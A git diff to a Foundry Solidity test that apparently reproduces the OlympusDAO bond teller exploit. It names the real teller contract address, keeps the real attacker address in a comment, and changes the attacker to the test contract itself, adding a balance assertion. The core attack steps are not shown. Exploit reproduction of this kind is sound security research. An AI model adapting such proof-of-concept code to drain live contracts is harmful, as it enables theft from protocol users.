@@ -16,7 +16,8 @@ interface IBondFixedExpiryTeller {
 contract Exploit_OlympusDao is TestHarness, TokenBalanceTracker {
 
     address constant internal BOND_FIXED_EXPIRY_TELLER = 0x007FE7c498A2Cf30971ad8f2cbC36bd14Ac51156;
-    address constant internal ATTACKER = 0x443cf223e209E5A2c08114A2501D8F0f9Ec7d9Be;
+    // actual attacker address: 0x443cf223e209E5A2c08114A2501D8F0f9Ec7d9Be;
+    address internal ATTACKER = address(this);
     
     ExploitOlympusToken public exploitToken;
     IBondFixedExpiryTeller public bondExpiryTeller;
@@ -35,9 +36,9 @@ contract Exploit_OlympusDao is TestHarness, TokenBalanceTracker {
         updateBalanceTracker(BOND_FIXED_EXPIRY_TELLER);
     }
 
-    function test_Attack() public {
-        vm.startPrank(ATTACKER);
+    function test_attack() public {
         uint256 initialTellerContractBalance = IERC20(OHM).balanceOf(BOND_FIXED_EXPIRY_TELLER);
+        uint256 initialAttackerBalance = IERC20(OHM).balanceOf(ATTACKER);
         
         console.log("\nBefore Attack OHM Balance");
         logBalancesWithLabel('Teller', BOND_FIXED_EXPIRY_TELLER);
@@ -50,7 +51,8 @@ contract Exploit_OlympusDao is TestHarness, TokenBalanceTracker {
         logBalancesWithLabel('Teller', BOND_FIXED_EXPIRY_TELLER);
         logBalancesWithLabel('Attacker', ATTACKER);
 
-        vm.stopPrank();
+        uint256 finalAttackerBalance = IERC20(OHM).balanceOf(ATTACKER);
+        assertGe(finalAttackerBalance, initialAttackerBalance);
     }
 
 }
